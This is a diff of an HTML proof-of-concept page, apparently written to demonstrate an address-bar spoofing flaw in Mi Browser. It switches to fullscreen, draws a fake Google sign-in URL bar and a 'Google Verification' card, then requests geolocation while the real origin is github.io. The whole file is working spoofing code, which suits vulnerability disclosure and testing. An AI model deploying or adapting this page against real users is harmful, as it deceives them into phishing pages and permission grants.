@@ -1,28 +1,73 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Mi Browser - Final PoC index</title></head>
-<body style="margin:0;background:#111;color:#fff;font-family:sans-serif;text-align:center;padding:30px">
-<h2>Mi Browser Spoof PoC - index.html</h2>
-<p>Tap to enter fullscreen - test no glitch</p>
-<button onclick="go()" style="padding:15px 30px;font-size:18px;background:#2962ff;color:#fff;border:0;border-radius:8px">START</button>
-<div id="f" style="display:none;position:fixed;inset:0;background:#000;z-index:9999">
-<div style="background:#202124;color:#e8eaed;padding:12px 16px;text-align:left;font-size:13px;border-bottom:1px solid #333">🔒 https://accounts.google.com/signin</div>
-<div style="background:#121212;flex:1;display:flex;align-items:center;justify-content:center;height:calc(100% - 42px)">
-<div style="background:#1e1e1e;border:1px solid #333;border-radius:12px;padding:20px;width:85%;max-width:320px">
-<h3 style="margin:0 0 10px">Google Verification</h3>
-<input value="victim@gmail.com" style="width:100%;padding:12px;box-sizing:border-box;background:#2d2e30;border:1px solid #5f6368;color:#fff;border-radius:8px">
-<br><br>
-<button onclick="navigator.geolocation.getCurrentPosition(a=>alert('LOC SUCCESS:'+a.coords.latitude),e=>alert('Denied Code:'+e.code))" style="width:100%;padding:12px;background:#8ab4f8;border:0;border-radius:8px;font-weight:bold">Verify & Continue</button>
-<p style="color:#fbbc04;font-size:11px;margin-top:10px">This should show origin as github.io, not google.com</p>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PoC Mi Browser - Fixed Button</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#0a0a0a;color:#fff;font-family:sans-serif}
+#landing{height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px}
+#attack{display:none;background:#000;min-height:100vh}
+.fake-url{background:#202124;color:#e8eaed;padding:12px 16px;font-size:13px;border-bottom:1px solid #333;text-align:left}
+.card{max-width:360px;margin:60px auto;background:#1e1e1e;border:1px solid #333;border-radius:16px;padding:20px}
+.card input{width:100%;padding:14px;border-radius:8px;border:1px solid #5f6368;background:#2d2e30;color:#fff}
+.btn{width:100%;padding:14px;border:0;border-radius:8px;font-weight:bold;font-size:15px}
+.btn-blue{background:#8ab4f8;color:#202124;margin-top:16px}
+.btn-start{background:#2962ff;color:#fff;padding:16px 32px;border-radius:12px;font-size:18px}
+small{color:#9aa0a6;font-size:11px;display:block;margin-top:10px}
+</style>
+</head>
+<body id="b">
+
+<div id="landing">
+  <h3 style="margin:0">Mi Browser Spoof PoC</h3>
+  <p style="color:#9aa0a6;font-size:13px">index.html - Fixed Button Version</p>
+  <button class="btn-start" id="startBtn">START FULLSCREEN</button>
 </div>
+
+<div id="attack">
+  <div class="fake-url">🔒 https://accounts.google.com/signin</div>
+  <div class="card" id="clickArea">
+    <h3 style="margin:0 0 8px 0">Google Verification</h3>
+    <p style="color:#9aa0a6;font-size:13px;margin:0 0 16px 0">Confirm your identity to continue</p>
+    <input value="victim@gmail.com" readonly>
+    <button class="btn btn-blue" id="verifyBtn">Verify & Continue</button>
+    <small>Real origin: <span id="origin"></span><br>This should show github.io when permission appears, but user sees google.com</small>
+    <button class="btn" style="background:#333;color:#fff;margin-top:12px" onclick="location.reload()">Exit / Reload</button>
+  </div>
 </div>
-</div>
+
 <script>
-function go(){
- document.documentElement.requestFullscreen().catch(()=>{});
- document.getElementById('f').style.display='block';
+const body = document.getElementById('b');
+const landing = document.getElementById('landing');
+const attack = document.getElementById('attack');
+document.getElementById('origin').textContent = location.href;
+
+document.getElementById('startBtn').addEventListener('click', async () => {
+  try{ await body.requestFullscreen(); }
+  catch(e){ await document.documentElement.requestFullscreen().catch(()=>{}); }
+  landing.style.display='none';
+  attack.style.display='block';
+});
+
+const verifyBtn = document.getElementById('verifyBtn');
+function trigger(){
+  alert('SPOOFED! User sees: https://accounts.google.com/signin Real origin: '+location.href);
+  navigator.geolocation.getCurrentPosition(
+    p=>alert('SUCCESS - Got location from '+location.hostname+': '+p.coords.latitude+','+p.coords.longitude),
+    e=>alert('Geolocation prompt origin is: '+location.hostname+' (should be github.io, not google.com) Error: '+e.code)
+  );
 }
-document.addEventListener('fullscreenchange',()=>{if(!document.fullscreenElement)document.getElementById('f').style.display='none'});
+verifyBtn.addEventListener('click', trigger);
+verifyBtn.addEventListener('touchend', (e)=>{e.preventDefault(); trigger();});
+
+document.addEventListener('fullscreenchange', ()=>{
+  if(!document.fullscreenElement){
+    landing.style.display='flex';
+    attack.style.display='none';
+  }
+});
 </script>
 </body>
 </html>
